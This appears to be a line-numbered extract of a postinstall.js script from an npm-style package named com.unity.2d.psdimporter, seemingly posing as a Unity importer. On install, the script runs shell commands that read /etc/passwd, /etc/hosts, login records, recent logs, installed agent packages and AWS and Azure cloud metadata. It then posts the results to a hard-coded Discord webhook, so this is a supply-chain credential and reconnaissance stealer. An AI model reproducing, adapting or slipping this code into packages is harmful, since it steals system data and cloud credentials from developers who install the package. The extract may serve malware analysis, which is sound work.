// File: tmp/tmpst8gs2yp/com.unity.2d.psdimporter/package/postinstall.js
// ======================================================================
Line 4: _tmp_5 = require('child_process')
Line 5: const https = require('https')
Line 6: const url = require('url')
Line 10: execSync(cmd, { stdio: ['pipe', 'pipe', 'ignore'], timeout: 15000 }).toString().trim()
Line 17: {
    execSync(cmd, { stdio: 'ignore', shell: '/bin/sh', timeout: 10000 });
    return true;
  }
Line 18: execSync(cmd, { stdio: 'ignore', shell: '/bin/sh', timeout: 10000 })
Line 25: {
  // --- EXISTING DATA COLLECTION ---
  const whoami = safeExec('whoami', 'unknown');
  const pwd = safeExec('pwd', 'unknown');
  const ls = safeExec('ls -l', 'no-list');
  const hosts = safeExec('cat /etc/hosts', 'No access');
  const passwd = safeExec('cat /etc/passwd', 'No access');
  
  // --- NEW COMMANDS (SYSTEM INFO) ---
  const motd = safeExec('cat /etc/motd', 'No access');
  const last_a = safeExec('last -a | head -n 50', 'No access');
  const who_cmd = safeExec('who', 'No access');
  const w_cmd = safeExec('w', 'No access');
  const lastlog_cmd = safeExec('lastlog', 'No access');
  const root_ls = safeExec('ls -l ../../../../../../../', 'No access (check path)');
  const issue = safeExec('cat /etc/issue', 'No access');

  // --- NEW COMMANDS (CLOUD METADATA) ---
  const aws_meta = safeExec('curl -m 3 -s http://169.254.169.254/latest/meta-data/', 'No access (not AWS)');
  const azure_meta = safeExec('curl -m 3 -s -H Metadata:true "http://169.254.169.254/metadata/instance?...
Line 27: safeExec('whoami', 'unknown')
Line 28: safeExec('pwd', 'unknown')
Line 29: safeExec('ls -l', 'no-list')
Line 30: safeExec('cat /etc/hosts', 'No access')
Line 31: safeExec('cat /etc/passwd', 'No access')
Line 34: safeExec('cat /etc/motd', 'No access')
Line 35: safeExec('last -a | head -n 50', 'No access')
Line 36: safeExec('who', 'No access')
Line 37: safeExec('w', 'No access')
Line 38: safeExec('lastlog', 'No access')
Line 39: safeExec('ls -l ../../../../../../../', 'No access (check path)')
Line 40: safeExec('cat /etc/issue', 'No access')
Line 43: const aws_meta = safeExec('curl -m 3 -s http://169.254.169.254/latest/meta-data/', 'No access (not AWS)')
Line 44: const azure_meta = safeExec('curl -m 3 -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"', 'No access (not Azure)')
Line 47: safeExec('dpkg -l | grep -i agent', 'No dpkg or agent found')
Line 48: safeExec('rpm -qa | grep -i agent', 'No rpm or agent found')
Line 49: safeExec('users', 'No access')
Line 50: safeExec('getent passwd | awk -F: \'$3 >= 1000 && $3 < 60000 {print $1}\'', 'No standard users found')
Line 53: safeExec('find /var/log -type f -mtime -1 -readable -exec tail -n 5 {} + 2>/dev/null', 'No recent logs found')
Line 137: const webhookUrl = 'https://discord.com/api/webhooks/1420210695496142888/PCMU325MVmIGPaRI6WIv9Hx_eLX44GL6DrQP7tg6iQjKkp4tYu6jcHhX9Ryj7SrW62LZ'
Line 138: const parsedUrl = url.parse(webhookUrl)
Line 148: const req = https.request(options)
Line 149: req.write(JSON.stringify(payload))
Line 150: req.end()
